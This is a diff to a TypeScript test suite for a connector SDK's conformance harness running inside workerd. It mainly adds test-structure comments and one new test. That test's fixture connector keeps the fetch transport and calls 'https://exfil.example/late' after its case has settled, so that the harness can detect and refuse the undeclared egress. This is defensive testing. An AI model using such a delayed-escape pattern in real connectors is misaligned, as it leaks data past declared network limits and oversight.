@@ -16,6 +16,10 @@ const manifest: PermissionManifest = {
   egress: ['api.vendor.example'],
   egressEnforcement: 'enforced',
 };
+const noEgress: PermissionManifest = {
+  sideEffect: 'read',
+  egressEnforcement: 'enforced',
+};
 const requestCase: ConnectorConformanceCase = {
   name: 'request',
   input: {},
@@ -49,6 +53,7 @@ async function rejected(
 }
 
 it('loads the connector-sdk barrel inside workerd', () => {
+  // #then
   expect(typeof createConnector).toBe('function');
 });
 
@@ -134,12 +139,14 @@ it('restores the workerd global fetch identity after a case throws', async () =>
 });
 
 it('reports INSTRUMENTATION_REPLACED inside workerd when a case redefines global fetch', async () => {
+  // #given
   const saved = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
   let replacementCalls = 0;
   const replacementFetch: typeof fetch = async () => {
     replacementCalls += 1;
     return new Response();
   };
+  // #when
   const report = await rejected(
     assertConnectorConformance(
       factory(async (_input, _context, runtime) => {
@@ -151,6 +158,7 @@ it('reports INSTRUMENTATION_REPLACED inside workerd when a case redefines global
       { manifest, cases: [requestCase] },
     ),
   );
+  // #then
   expect(replacementCalls).toBe(1);
   expect(Object.getOwnPropertyDescriptor(globalThis, 'fetch')).toEqual(saved);
   expect(report.conformant).toBe(false);
@@ -172,6 +180,7 @@ it('reports INSTRUMENTATION_REPLACED inside workerd when a case redefines global
 });
 
 it('records INSTRUMENTATION_REPLACED inside workerd when a case assigns global fetch', async () => {
+  // #given
   const saved = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
   let replacementCalls = 0;
   const replacement: typeof fetch = async () => {
@@ -180,6 +189,7 @@ it('records INSTRUMENTATION_REPLACED inside workerd when a case assigns global f
   };
   let assigned = false;
   let intact = false;
+  // #when
   const report = await rejected(
     assertConnectorConformance(
       factory(async () => {
@@ -194,6 +204,7 @@ it('records INSTRUMENTATION_REPLACED inside workerd when a case assigns global f
       { manifest, cases: [requestCase] },
     ),
   );
+  // #then
   expect(
     saved?.configurable,
     'workerd global fetch uses the configurable accessor arm',
@@ -221,9 +232,11 @@ it('records INSTRUMENTATION_REPLACED inside workerd when a case assigns global f
   expect(Object.getOwnPropertyDescriptor(globalThis, 'fetch')).toEqual(saved);
 });
 
-it('records FACTORY_FAILED when the case factory throws a null-prototype object', async () => {
+it('records FACTORY_FAILED inside workerd when the case factory throws a null-prototype object', async () => {
+  // #given
   const saved = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
   let constructions = 0;
+  // #when
   const report = await rejected(
     assertConnectorConformance(
       (runtime) => {
@@ -233,6 +246,7 @@ it('records FACTORY_FAILED when the case factory throws a null-prototype object'
       { manifest, cases: [requestCase] },
     ),
   );
+  // #then
   expect(report.conformant).toBe(false);
   expect(report.findings).toEqual([
     { code: 'FACTORY_FAILED', case: 'request', reason: 'a non-Error object' },
@@ -241,11 +255,83 @@ it('records FACTORY_FAILED when the case factory throws a null-prototype object'
   expect(Object.getOwnPropertyDescriptor(globalThis, 'fetch')).toEqual(saved);
 });
 
-it('accepts the workerd global fetch descriptor the harness requires', () => {
+it('names the settled case on a late escape inside workerd', async () => {
   // #given
+  const saved = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
+  let release!: () => void;
+  const gate = new Promise<void>((resolve) => {
+    release = resolve;
+  });
+  let late: Promise<void> | undefined;
+  let lateRefusal: unknown;
+  const subject: ConnectorConformanceFactory<unknown, unknown> = (runtime) => {
+    const base = runtime.policies.fetch as (url: string) => Promise<unknown>;
+    return createConnector<unknown, unknown>({
+      id: 'vendor.read',
+      description: 'Workerd late-escape fixture',
+      permissions: noEgress,
+      policies: runtime.policies,
+      execute: async (input) => {
+        if ((input as { phase?: string }).phase === 'capture') {
+          late = (async () => {
+            await gate;
+            try {
+              await base('https://exfil.example/late');
+            } catch (error) {
+              lateRefusal = error;
+            }
+          })();
+          return {};
+        }
+        // Releasing the gate queues the capture case's abandoned
+        // continuation as a microtask; the zero-delay timer holds this case
+        // open across it, so the retained transport is called after the
+        // capture case settles and while the run is still open.
+        release();
+        await new Promise<void>((resolve) => {
+          setTimeout(resolve, 0);
+        });
+        return {};
+      },
+    });
+  };
+  // #when
+  const report = await rejected(
+    assertConnectorConformance(subject, {
+      manifest: noEgress,
+      cases: [
+        {
+          name: 'capture',
+          input: { phase: 'capture' },
+          expect: { outcome: 'no-network' },
+        },
+        {
+          name: 'settle',
+          input: { phase: 'settle' },
+          expect: { outcome: 'no-network' },
+        },
+      ],
+    }),
+  );
+  await late;
+  // #then
+  expect(report.findings).toEqual([
+    {
+      code: 'NETWORK_IO_OUTSIDE_RUNTIME_FETCH',
+      observedAfterCase: 'capture',
+      reason:
+        "connector reached policies.fetch for a host the registered egress declaration does not cover (host: exfil.example); observed after case 'capture' settled",
+    },
+  ]);
+  expect(report.findings[0]).not.toHaveProperty('case');
+  expect(report.cases[0]?.escapes).toEqual([]);
+  expect(lateRefusal).toBeInstanceOf(Error);
+  expect(Object.getOwnPropertyDescriptor(globalThis, 'fetch')).toEqual(saved);
+});
+
+it('accepts the workerd global fetch descriptor the harness requires', () => {
   // #when
   const d = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
-  console.info(`workerd fetch configurable=${d?.configurable}`);
   // #then
   expect(
     d !== undefined &&
